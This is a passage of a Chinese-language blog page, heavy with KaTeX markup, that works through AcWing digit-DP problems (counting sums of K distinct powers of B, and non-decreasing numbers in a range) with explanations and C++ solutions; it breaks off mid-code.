style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span></span></span></span></span></span></span></span><br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>20</mn><mo>=</mo><msup><mn>2</mn><mn>4</mn></msup><mo>+</mo><msup><mn>2</mn><mn>2</mn></msup></mrow><annotation encoding="application/x-tex">20 = 2^4 + 2^2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">20</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8974em;vertical-align:-0.0833em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span></p><p><strong>输入格式</strong></p><p>第一行包含两个整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi></mrow><annotation encoding="application/x-tex">X</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Y</mi></mrow><annotation encoding="application/x-tex">Y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span></span></span></span>，接下来两行包含整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>K</mi></mrow><annotation encoding="application/x-tex">K</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi></mrow><annotation encoding="application/x-tex">B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span>。</p><p><strong>输出格式</strong></p><p>只包含一个整数，表示满足条件的数的个数。</p><p><strong>数据范围</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>X</mi><mo>≤</mo><mi>Y</mi><mo>≤</mo><msup><mn>2</mn><mn>31</mn></msup><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">1 \le X \le Y \le 2^{31}-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8974em;vertical-align:-0.0833em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">31</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>,<br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>K</mi><mo>≤</mo><mn>20</mn></mrow><annotation encoding="application/x-tex">1 \le K \le 20</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">20</span></span></span></span>,<br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn><mo>≤</mo><mi>B</mi><mo>≤</mo><mn>10</mn></mrow><annotation encoding="application/x-tex">2 \le B \le 10</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">10</span></span></span></span></p><p><strong>输入样例：</strong></p><pre><code>15 2022</code></pre><p><strong>输出样例：</strong></p><pre><code>3</code></pre><h3 id="数位DP-2">数位DP</h3><p><strong>树分支</strong></p><p>只有当前位上数大于0才存在左右分支</p><p>当 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mo>&gt;</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">x&gt;0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span> 时，左支一定会存在：左支取 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo>∼</mo><mi>x</mi><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">0\sim x-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∼</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>, 当 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mo>&gt;</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">x&gt;0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span> 时，左支至少可以取0</p><p>当 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mo>&gt;</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">x&gt;1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> 时，右支不能存在，左支中可以再取0：当 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mo>&gt;</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">x&gt;1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> 时，按照数型结构此层就得取 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">x</span></span></span></span>，而题目中规定的是**“恰好等于”**，即每一为上数字必须取0或1，所以右分支不能继续往下走了。</p><p>当 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">x = 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> 时，右支取1（左支取 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo>∼</mo><mi>x</mi><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">0\sim x -1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∼</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> 就不能再取啦），沿右支进入下一层</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">35</span>;</span><br><span class="line"><span class="type">int</span> K, B;</span><br><span class="line"><span class="type">int</span> f[kN][kN];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 计算f[i][j]: C_a^b</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; kN; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt;= i; j++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (!j) &#123;</span><br><span class="line">        f[i][j] = <span class="number">1</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        f[i][j] = f[i - <span class="number">1</span>][j] + f[i - <span class="number">1</span>][j - <span class="number">1</span>];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">dp</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!n) <span class="keyword">return</span> <span class="number">0</span>;  <span class="comment">// K &gt;= 1</span></span><br><span class="line">  vector&lt;<span class="type">int</span>&gt; nums;</span><br><span class="line">  <span class="keyword">while</span> (n) &#123;</span><br><span class="line">    nums.<span class="built_in">push_back</span>(n % B);  <span class="comment">// B进制, 而非十进制</span></span><br><span class="line">    n /= B;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">  <span class="type">int</span> last = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = nums.<span class="built_in">size</span>() - <span class="number">1</span>; ~i; i--) &#123;  <span class="comment">// ~i等价于i != -1</span></span><br><span class="line">    <span class="type">int</span> x = nums[i];</span><br><span class="line">    <span class="keyword">if</span> (x) &#123;  <span class="comment">// 当前值大于0才会存在左右分支</span></span><br><span class="line">      res += f[i][K - last];  <span class="comment">// a_&#123;n-1&#125;选0, a_&#123;n-2&#125;到a_0有i=n-1个数</span></span><br><span class="line">      <span class="keyword">if</span> (x &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (K - last - <span class="number">1</span> &gt;= <span class="number">0</span>) res += f[i][K - last - <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">break</span>;  <span class="comment">// x&gt;1时, 右分支a_&#123;n-1&#125;没法往下走</span></span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;  <span class="comment">// x=1时, 成为右分支往下一层走</span></span><br><span class="line">        last++;</span><br><span class="line">        <span class="keyword">if</span> (last &gt; K) <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!i &amp;&amp; last == K) res++;  <span class="comment">// 整棵树唯一的右根</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">init</span>();</span><br><span class="line">  <span class="type">int</span> l, r;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d%d&quot;</span>, &amp;l, &amp;r, &amp;K, &amp;B);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, <span class="built_in">dp</span>(r) - <span class="built_in">dp</span>(l - <span class="number">1</span>));</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="AcWing-1082-数字游戏"><a href="https://www.acwing.com/problem/content/1084/">AcWing 1082. 数字游戏</a></h2><p>科协里最近很流行数字游戏。</p><p>某人命名了一种不降数，这种数字必须满足从左到右各位数字呈非下降关系，如 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>123</mn></mrow><annotation encoding="application/x-tex">123</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">123</span></span></span></span>，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>446</mn></mrow><annotation encoding="application/x-tex">446</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">446</span></span></span></span>。</p><p>现在大家决定玩一个游戏，指定一个整数闭区间 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[a,b]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">b</span><span class="mclose">]</span></span></span></span>，问这个区间内有多少个不降数。</p><p><strong>输入格式</strong></p><p>输入包含多组测试数据。</p><p>每组数据占一行，包含两个整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">a</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi></mrow><annotation encoding="application/x-tex">b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">b</span></span></span></span>。</p><p><strong>输出格式</strong></p><p>每行给出一组测试数据的答案，即 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[a,b]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">b</span><span class="mclose">]</span></span></span></span> 之间有多少不降数。</p><p><strong>数据范围</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>a</mi><mo>≤</mo><mi>b</mi><mo>≤</mo><msup><mn>2</mn><mn>31</mn></msup><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">1 \le a \le b \le 2^{31}-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8304em;vertical-align:-0.136em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8974em;vertical-align:-0.0833em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">31</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span></p><p><strong>输入样例：</strong></p><pre><code>1 91 19</code></pre><p><strong>输出样例：</strong></p><pre><code>918</code></pre><h3 id="数位dp">数位dp</h3><p>根据每一位<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">a_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>的值可分为左右两支：</p><ul><li><strong>左支</strong> 最高位取<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo>∼</mo><msub><mi>a</mi><mi>n</mi></msub><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">0 \sim a_n -1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∼</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>（其实是<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>&lt;</mo><mi>l</mi><mi>a</mi><mi>s</mi><mi>t</mi><mo>&gt;</mo><mo>∼</mo><msub><mi>a</mi><mi>n</mi></msub><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">&lt;last&gt; \sim a_n -1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7335em;vertical-align:-0.0391em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">a</span><span class="mord mathnormal">s</span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;∼</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>），低位无限制，可以<strong>预计算</strong></li><li><strong>右支</strong> 最高为取<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">a_n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，低位有限制，需要进一步分支</li></ul><p><img src="/2022/12/01/%E7%AE%97%E6%B3%95-AcWing%E7%AE%97%E6%B3%95%E6%8F%90%E9%AB%98%E8%AF%BE-%E7%AC%AC1-8%E8%AE%B2-%E6%95%B0%E4%BD%8DDP/image-20221212195232246.png" alt></p><p><img src="/2022/12/01/%E7%AE%97%E6%B3%95-AcWing%E7%AE%97%E6%B3%95%E6%8F%90%E9%AB%98%E8%AF%BE-%E7%AC%AC1-8%E8%AE%B2-%E6%95%B0%E4%BD%8DDP/image-20221212195302995.png" alt></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">15</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> f[kN][kN];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 计算f[i][j]: i位且最高位为j的不降数个数</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  